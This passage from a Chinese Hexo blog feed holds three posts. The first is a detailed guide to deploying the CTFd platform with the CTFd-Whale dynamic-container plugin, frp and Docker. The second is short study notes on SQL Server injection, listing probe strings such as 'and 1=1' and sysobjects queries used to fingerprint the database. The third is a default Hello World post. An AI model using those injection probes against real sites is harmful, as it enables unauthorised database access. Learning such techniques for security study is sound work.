/opt/CTFd/docker-entrypoint.sh</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">chown</span> -R 1001:1001 /opt/CTFd</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">chown</span> -R 1001:1001 /var/log/CTFd /var/uploads</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">USER</span> <span class="number">1001</span></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">8000</span></span><br><span class="line"><span class="keyword">ENTRYPOINT</span><span class="language-bash"> [<span class="string">&quot;/opt/CTFd/docker-entrypoint.sh&quot;</span>]</span></span><br></pre></td></tr></table></figure><p>注意点：</p><ol><li>第一处的镜像源可百度更换其它源，例如</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sed -i &#x27;s/dl-cdn.alpinelinux.org/mirrors.tuna.tsinghua.edu.cn/g&#x27; /etc/apk/repositories`</span><br><span class="line">注意如果出现问题检查下最后有没有`&amp;&amp; \</span><br></pre></td></tr></table></figure><ol><li>python版本一般不需要换</li><li>RUN第三行我将python和python-dev删掉了，如果要加上则会报错<code>python requires by world</code>之类的，请加上<code>python2</code>或<code>python3</code>，<code>python2-dev</code>或<code>python3-dev</code>.即可解决。删掉后没有发现对服务有什么影响</li><li>所有<code>-i &quot;url&quot;</code>都是指定源，如果下载失败则可更换源再试</li><li>第二处注意即我更换了源，因为之前看其他教程下载失败了</li></ol><h3 id="6-准备完毕"><a href="#6-准备完毕" class="headerlink" title="6.准备完毕"></a>6.准备完毕</h3><p>运行<code>docker-compose build</code><br>静待完成</p><p><img src="https://err0r.top/article/CTFD/20201017233234439.png" alt="build"></p><p>然后运行<code>docker-compose up -d</code></p><p><img src="https://err0r.top/article/CTFD/20201017233300241.png" alt="up"></p><p>如图所示，有WARNING即为在集群网络类，是正常情况<br>运行<code>docker ps</code>查看容器情况</p><p><img src="https://err0r.top/article/CTFD/20201017233329640.png" alt="ps"></p><p>访问 <a href="http://ip:8000/">http://ip:8000</a> 即可访问ctfd</p><h3 id="配置CTFD"><a href="#配置CTFD" class="headerlink" title="配置CTFD"></a>配置CTFD</h3><p>进入后随便设置，然后进Admin Panel进行设置</p><table><thead><tr><th>属性</th><th>配置</th></tr></thead><tbody><tr><td>Docker API URL</td><td>unix:&#x2F;&#x2F;var&#x2F;run&#x2F;docker.sock</td></tr><tr><td>Frp API IP</td><td>frpc的ip配置</td></tr><tr><td>Frp API Port</td><td>frpc的端口配置</td></tr><tr><td>Frp Http Domain Suffix</td><td>Docker API URL to connect（可填None）</td></tr><tr><td>Frp Http Port</td><td>80</td></tr><tr><td>Frp Direct IP Address</td><td>你的公网ip，本机即为127.0.0.1</td></tr><tr><td>Frp Direct Minimum Port</td><td>与之前frps最小端口呼应</td></tr><tr><td>Frp Direct Minimum Port</td><td>与之前frps最大端口呼应</td></tr><tr><td>Max Container Count</td><td>不超过最大-最小</td></tr><tr><td>Max Renewal Times</td><td>最大实例延时次数</td></tr><tr><td>Frp config template</td><td>填入frps的配置，只需填[common]</td></tr><tr><td>Docker Auto Connect Containers</td><td>ctfd_frpc_1</td></tr><tr><td>Docker Dns Setting</td><td>可填机器内DNS，没有可填个外网DNS</td></tr><tr><td>Docker Swarm Nodes</td><td>linux-1 与前面swarm集群呼应</td></tr><tr><td>Docker Multi-Container Network Subnet</td><td>内网题大子网ip配置&#x2F;CIDR</td></tr><tr><td>Docker Multi-Container Network Subnet New Prefix</td><td>每个内网题实例的CIDR</td></tr><tr><td>Docker Container Timeout</td><td>单位为秒</td></tr></tbody></table><p>最后附上我的配置图片</p><p><img src="https://err0r.top/article/CTFD/20201017233350699.png" alt="配置1"><img src="https://err0r.top/article/CTFD/20201017233413853.png" alt="配置2"><img src="https://err0r.top/article/CTFD/20201017233431163.png" alt="配置3"></p><h3 id="设置docker网络"><a href="#设置docker网络" class="headerlink" title="设置docker网络"></a>设置docker网络</h3><p>这个时候运行<code>docker ps</code><br>发现frpc在无限重启，因为我们还没有配置网络<br>运行<code>docker network ls</code></p><p><img src="https://err0r.top/article/CTFD/20201017234359215.png" alt="容器"></p><p>显示ctfd_frp-containers</p><p>运行<code>docker network inspect ctfd_frp</code></p><p><img src="https://err0r.top/article/CTFD/20201017234428683.png" alt="ctfd_frp"></p><p>这个是docker-compose里compose后创建的网络，我们将frps加入此网络，例如我的frp容器id为12345，则运行<code>docker network connect ctfd_frp 12345&lt;即frp容器id&gt;</code>。再运行<code>docker network inspect ctfd_frp</code>，如下<img src="https://err0r.top/article/CTFD/20201017234344822.png" alt="在这里插入图片描述"></p><p>这里可以看到ip与我们之前设置的相应。</p><p>此时运行<code>docker restart ctfd_frpc_1 frp_frps_1</code></p><p>然后<code>docker ps</code></p><p>最终如下<img src="https://err0r.top/article/CTFD/20201017234457228.png" alt="ps"></p><p>成功完成。</p><p>最后设置道题目选择（我做了汉化）</p><p><img src="https://err0r.top/article/CTFD/20201017233701655.png" alt="题目1"><img src="https://err0r.top/article/CTFD/20201017233922648.png" alt="题目2"><img src="https://err0r.top/article/CTFD/20201017234241273.png" alt="在这里插入图片描述"></p><p><code>docker ps</code>里可以看到容器成功启动，地址正常访问</p><h3 id="坑点注意"><a href="#坑点注意" class="headerlink" title="坑点注意"></a>坑点注意</h3><ol><li>如果frpc重复出现retrying，请返回检查docker-compose.yml。找到frpc设置，检查ip设置是否正确。再检查ctfd的Admin Panel里ctfd-whale设置是否正确。</li><li>如果出现安装某个文件失败问题，请更换源，很多都是源里没有指定文件造成的。可以自行访问一下网站，查看一下要下载的文件名，再进行配置。</li><li>似乎docker和系统的版本会有影响，本机为CentOS7.4 64位，腾讯云，docker配置如下</li></ol><p><img src="https://err0r.top/article/CTFD/20201017234315447.png" alt="版本"></p><ol><li><p>python的问题，上面提到的，可以删除，是因为没有指定版本的原因，也可以指定版本再下载</p></li><li><p>ctfd运行<code>docker-compose up -d</code>后有可能提示docker-entrypoint.sh没有权限，手动加个权限即可。在CTFd文件夹下运行<code>chmod a+x docker-entrypoint.sh</code>（docker-compose.yml里其实写了加权限，但是最后并没有加上去？）</p></li><li><p>如果docker容器无法启动或者frp端口无法映射可以进容器检查</p><p>确保docker api填写正确，如docker-compose.yml中写的unix:&#x2F;&#x2F;&#x2F;var&#x2F;run&#x2F;docker.sock<br>你也可以使用端口形式的api如<a href="https://success.docker.com/article/how-do-i-enable-the-remote-api-for-dockerd">官方示例</a>：可以用IP：端口指定API</p><h6 id="docker容器无法启动问题"><a href="#docker容器无法启动问题" class="headerlink" title="docker容器无法启动问题"></a>docker容器无法启动问题</h6><p>进入容器检查：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">docker exec -it &lt;ctfd容器id&gt; sh</span><br><span class="line">/opt/CTFd# python</span><br><span class="line">&gt;&gt;&gt;import docker</span><br><span class="line">&gt;&gt;&gt;client=docker.DockerClient(base_url=&quot;unix:///var/run/docker.sock&quot;)</span><br><span class="line">&gt;&gt;&gt;client.images.list()</span><br></pre></td></tr></table></figure><p>如果api正确会列出所有镜像</p><h6 id="frp端口无法映射问题"><a href="#frp端口无法映射问题" class="headerlink" title="frp端口无法映射问题"></a>frp端口无法映射问题</h6><p>进入容器检查：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">//其实检查可以顺便检查一下上面的，因为都在ctfd容器内</span><br><span class="line">docker exec -it &lt;ctfd容器id&gt; sh</span><br><span class="line">/opt/CTFd# python</span><br><span class="line">&gt;&gt;&gt;import requests</span><br><span class="line">&gt;&gt;&gt;requests.get(&quot;http://172.1.0.3:7400/api/reload&quot;)//即frp api的地址</span><br><span class="line"></span><br><span class="line">返回</span><br><span class="line">&lt;Response [200]&gt; #表示成功</span><br></pre></td></tr></table></figure><p>如果frpc还是出现如下问题</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">requests.exceptions.ConnectionError: HTTPConnectionPool(host=&#x27;172.1.0.3&#x27;, port=7400): Max retries exceeded with url: /api/reload (Caused by NewConnectionError(&#x27;&lt;urllib3.connection.HTTPConnection object at 0x7f8df919f850&gt;: Failed to establish a new connection: [Errno 111] Connection refused&#x27;))</span><br></pre></td></tr></table></figure><p>则重新配置frpc。编辑&#x2F;CTFd&#x2F;frpc&#x2F;frpc.ini</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">token = randomme</span><br><span class="line">server_addr = 172.1.0.4</span><br><span class="line">server_port = 6490</span><br><span class="line">pool_count = 200</span><br><span class="line">tls_enable = true</span><br><span class="line"></span><br><span class="line">admin_addr = 172.1.0.3 #这里千万千万别忘加，之前要被搞气死</span><br><span class="line">admin_port = 7400</span><br></pre></td></tr></table></figure><p>然后运行<code>docker restart ctfd_frpc_1</code>（这里再看frpc.ini会发现内容更新了，admin配置没了，不用担心）</p><p>再进容器检查<code>requests.get(&quot;http://172.1.0.3:7400/api/reload&quot;)</code>应该就可以了<code>&lt;Response [200]&gt;</code></p></li><li><p>遇事不决请重启</p></li><li><p>如果发现frp端口冲突，请检查本地frpc或者frps服务，frp是在docker上<strong>不是在本地</strong>的！</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">systemctl stop frpc</span><br><span class="line">systemctl stop frps</span><br></pre></td></tr></table></figure></li><li><p>活用查看log</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker logs &lt;ctfd容器id&gt;</span><br><span class="line">docker logs &lt;frp容器id&gt;</span><br></pre></td></tr></table></figure></li><li><p>如果修改了任意配置，请跟着修改<strong>系列配置</strong>，很多就是因为漏改造成的</p></li></ol><p>11.docker ps显示正常但是无法访问</p><p>可以使用 <code>docker logs ctfd_ctfd_1</code> 查看输出，如果发现输出类似：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">/usr/local/lib/python3.7/site-packages/tzlocal/unix.py:158: UserWarning: Can not find any timezone configuration, defaulting to UTC.</span><br><span class="line">  warnings.warn(&#x27;Can not find any timezone configuration, defaulting to UTC.&#x27;)</span><br><span class="line">Starting CTFd</span><br><span class="line">/usr/local/lib/python3.7/importlib/_bootstrap.py:219: RuntimeWarning: greenlet.greenlet size changed, may indicate binary incompatibility. Expected 144 from C header, got 152 from PyObject</span><br><span class="line">  return f(*args, **kwds)</span><br><span class="line">/usr/local/lib/python3.7/importlib/_bootstrap.py:219: RuntimeWarning: greenlet.greenlet size changed, may indicate binary incompatibility. Expected 144 from C header, got 152 from PyObject</span><br><span class="line">  return f(*args, **kwds)</span><br><span class="line">/usr/local/lib/python3.7/importlib/_bootstrap.py:219: RuntimeWarning: greenlet.greenlet size changed, may indicate binary incompatibility. Expected 144 from C header, got 152 from PyObject</span><br><span class="line">  return f(*args, **kwds)</span><br><span class="line">[2020-10-11 12:31:30 +0000] [1] [INFO] Starting gunicorn 19.9.0</span><br><span class="line">[2020-10-11 12:31:30 +0000] [1] [INFO] Listening at: http://0.0.0.0:8000 (1)</span><br><span class="line">[2020-10-11 12:31:30 +0000] [1] [INFO] Using worker: gevent</span><br><span class="line">[2020-10-11 12:31:30 +0000] [21] [INFO] Booting worker with pid: 21</span><br><span class="line">[2020-10-11 12:31:31 +0000] [23] [INFO] Booting worker with pid: 23</span><br><span class="line">[2020-10-11 12:31:32 +0000] [25] [INFO] Booting worker with pid: 25</span><br><span class="line">[2020-10-11 12:31:34 +0000] [27] [INFO] Booting worker with pid: 27</span><br><span class="line">[2020-10-11 12:31:35 +0000] [29] [INFO] Booting worker with pid: 29</span><br><span class="line">[2020-10-11 12:31:36 +0000] [31] [INFO] Booting worker with pid: 31</span><br><span class="line">[2020-10-11 12:31:37 +0000] [33] [INFO] Booting worker with pid: 33</span><br><span class="line">[2020-10-11 12:31:39 +0000] [35] [INFO] Booting worker with pid: 35</span><br><span class="line">[2020-10-11 12:31:40 +0000] [37] [INFO] Booting worker with pid: 37(一直在加)</span><br></pre></td></tr></table></figure><p>则问题为<a href="https://stackoverflow.com/questions/64105616/greenlet-runtime-error-and-deployed-app-in-docker-keeps-booting-all-the-workers">这篇文章中所提到的问题</a>，只需要删除 <code>requirements.txt</code> 中的 <code>gevent</code> 版本号即可，结果类似下面这样</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">/requirements.txt</span><br><span class="line">...</span><br><span class="line">redis==3.3.11</span><br><span class="line">datafreeze==0.1.0</span><br><span class="line">gevent</span><br><span class="line">python-dotenv==0.10.3</span><br><span class="line">flask-restplus==0.13.0</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>然后 <code>docker-compose down</code> 再启动 <code>docker-compose up -d --build</code> 不出意外应该就能解决问题</p><p>(更新)12.出现如下问题可参考<a href="https://github.com/glzjin/CTFd-Whale/issues/20">此issue</a>提出的问题，在ctfd的docker-compose.yml添加<code>/var/run/docker.sock:/var/run/docker.sock</code></p><p><img src="https://err0r.top/article/CTFD/99216164-ee25b080-280f-11eb-95a9-2c2a17895068.png" alt="image"></p><p>如下</p><p><img src="https://err0r.top/article/CTFD/image-20210225153426310.png" alt="image-20210225153426310"></p><h2 id="2021-2-25-更新"><a href="#2021-2-25-更新" class="headerlink" title="2021.2.25 更新"></a>2021.2.25 更新</h2><p>最新的CTFd改了部分代码，由于兼容性问题，需要重新编辑一些东西，例如<code>Dockerfile</code></p><figure class="highlight docker"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> python:<span class="number">3.7</span>-slim-buster</span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /opt/CTFd</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">mkdir</span> -p /opt/CTFd /var/log/CTFd /var/uploads</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># hadolint ignore=DL3008</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">echo</span> <span class="string">&#x27;deb http://mirrors.aliyun.com/debian/ buster main non-free contrib \</span></span></span><br><span class="line"><span class="string"><span class="language-bash"> deb http://mirrors.aliyun.com/debian/ buster-updates main non-free contrib \</span></span></span><br><span class="line"><span class="string"><span class="language-bash"> deb http://mirrors.aliyun.com/debian/ buster-backports main non-free contrib \</span></span></span><br><span class="line"><span class="string"><span class="language-bash"> deb-src http://mirrors.aliyun.com/debian/ buster main non-free contrib \</span></span></span><br><span class="line"><span class="string"><span class="language-bash"> deb-src http://mirrors.aliyun.com/debian/ buster-updates main non-free contrib \</span></span></span><br><span class="line"><span class="string"><span class="language-bash"> deb-src http://mirrors.aliyun.com/debian/ buster-backports main non-free contrib \</span></span></span><br><span class="line"><span class="string"><span class="language-bash"> deb http://mirrors.aliyun.com/debian-security/ buster/updates main non-free contrib \</span></span></span><br><span class="line"><span class="string"><span class="language-bash"> deb-src http://mirrors.aliyun.com/debian-security/ buster/updates main non-free contrib&#x27;</span>&gt; /etc/apt/sources.list &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    apt-get update \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; apt-get install -y --no-install-recommends \</span></span><br><span class="line"><span class="language-bash">        build-essential \</span></span><br><span class="line"><span class="language-bash">        default-mysql-client \</span></span><br><span class="line"><span class="language-bash">        python3-dev \</span></span><br><span class="line"><span class="language-bash">        libffi-dev \</span></span><br><span class="line"><span class="language-bash">        libssl-dev \</span></span><br><span class="line"><span class="language-bash">        git \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; apt-get clean \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; <span class="built_in">rm</span> -rf /var/lib/apt/lists/*</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> requirements.txt /opt/CTFd/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> pip install -r requirements.txt -i http://mirrors.aliyun.com/pypi/simple/ --no-cache-dir</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> . /opt/CTFd</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># hadolint ignore=SC2086</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="keyword">for</span> d <span class="keyword">in</span> CTFd/plugins/*; <span class="keyword">do</span> \</span></span><br><span class="line"><span class="language-bash">        <span class="keyword">if</span> [ -f <span class="string">&quot;<span class="variable">$d</span>/requirements.txt&quot;</span> ]; <span class="keyword">then</span> \</span></span><br><span class="line"><span class="language-bash">            pip install -r <span class="variable">$d</span>/requirements.txt -i http://mirrors.aliyun.com/pypi/simple/ --no-cache-dir; \</span></span><br><span class="line"><span class="language-bash">        <span class="keyword">fi</span>; \</span></span><br><span class="line"><span class="language-bash">    <span class="keyword">done</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> adduser \</span></span><br><span class="line"><span class="language-bash">    --disabled-login \</span></span><br><span class="line"><span class="language-bash">    -u 1001 \</span></span><br><span class="line"><span class="language-bash">    --gecos <span class="string">&quot;&quot;</span> \</span></span><br><span class="line"><span class="language-bash">    --shell /bin/bash \</span></span><br><span class="line"><span class="language-bash">    ctfd</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">chmod</span> +x /opt/CTFd/docker-entrypoint.sh \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; <span class="built_in">chown</span> -R 1001:1001 /opt/CTFd /var/log/CTFd /var/uploads</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">USER</span> <span class="number">1001</span></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">8000</span></span><br><span class="line"><span class="keyword">ENTRYPOINT</span><span class="language-bash"> [<span class="string">&quot;/opt/CTFd/docker-entrypoint.sh&quot;</span>]</span></span><br></pre></td></tr></table></figure><p>其他pip源</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">清华：https://pypi.tuna.tsinghua.edu.cn/simple/</span><br><span class="line">中国科技大学 https://pypi.mirrors.ustc.edu.cn/simple/</span><br><span class="line">华中理工大学：http://pypi.hustunique.com/</span><br><span class="line">山东理工大学：http://pypi.sdutlinux.org/</span><br><span class="line">豆瓣：http://pypi.douban.com/simple/</span><br></pre></td></tr></table></figure><p><img src="https://err0r.top/article/CTFD/image-20210225163134408.png" alt="image-20210225163134408">![image-20210225163821673](<a href="https://err0r.top/article/CTFD/image-20210225163821673.png">https://err0r.top/article/CTFD/image-20210225163821673.png</a></p><h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://www.zhaoj.in/read-6333.html">CTFd-Whale 推荐部署实践</a>(赵师傅官方)</p><p><a href="https://blog.csdn.net/fjh1997/article/details/100850756/">手把手教你如何建立一个支持ctf动态独立靶机的靶场（ctfd+ctfd-whale）</a></p><p><a href="https://vaala.cat/2020/09/21/ctfd%E4%BD%BF%E7%94%A8ctfd-whale%E5%8A%A8%E6%80%81%E9%9D%B6%E6%9C%BA%E6%8F%92%E4%BB%B6%E6%90%AD%E5%BB%BA%E9%9D%B6%E5%9C%BA%E6%8C%87%E5%8D%97/">ctfd使用ctfd-whale动态靶机插件搭建靶场指南</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/08/30/cracer%E7%AC%94%E8%AE%B0/"/>
      <url>/2023/08/30/cracer%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="笔记"><a href="#笔记" class="headerlink" title="笔记"></a>笔记</h1><h3 id="SqlServer注入"><a href="#SqlServer注入" class="headerlink" title="SqlServer注入"></a>SqlServer注入</h3><p>常用语句</p><p>•说明：创建数据库</p><p>•CREATE DATABASE database-name </p><p>•2、说明：删除数据库</p><p>•drop database dbname</p><p>•查询所有：</p><p>•Select * from 表名</p><p>•select * from Student</p><h3 id="判断语句"><a href="#判断语句" class="headerlink" title="判断语句"></a>判断语句</h3><p>1.判断是否有注入 </p><p>and 1&#x3D;1 </p><p>and 1&#x3D;2 </p><p>•&#x2F;</p><p>•-0</p><p>•判断注入的方法是一样的</p><p>•2.初步判断是否是mssql </p><p>•and user&gt;0 </p><p>•3.判断数据库系统 </p><p>•and (select count(*) from sysobjects)&gt;0 mssql </p><p>•and (select count(*) from msysobjects)&gt;0 access </p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2023/08/29/hello-world/"/>
      <url>/2023/08/29/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;div align=center class=&quot;aspect-ratio&quot;&gt;</span><br><span class="line">    &lt;iframe src=&quot;https://player.bilibili.com/player.html?aid=474023258&amp;&amp;page=1&amp;as_wide=1&amp;high_quality=1&amp;danmaku=0&quot; </span><br><span class="line">    scrolling=&quot;no&quot; </span><br><span class="line">    border=&quot;0&quot; </span><br><span class="line">    frameborder=&quot;no&quot; </span><br><span class="line">    framespacing=&quot;0&quot; </span><br><span class="line">    high_quality=1</span><br><span class="line">    danmaku=1 </span><br><span class="line">    allowfullscreen=&quot;true&quot;&gt; </span><br><span class="line">    &lt;/iframe&gt;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure><div align=center class="aspect-ratio">    <iframe src="https://player.bilibili.com/player.html?aid=474023258&&page=1&as_wide=1&high_quality=1&danmaku=0"     scrolling="no"     border="0"     frameborder="no"     framespacing="0"     high_quality=1    danmaku=1     allowfullscreen="true">     </iframe></div>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
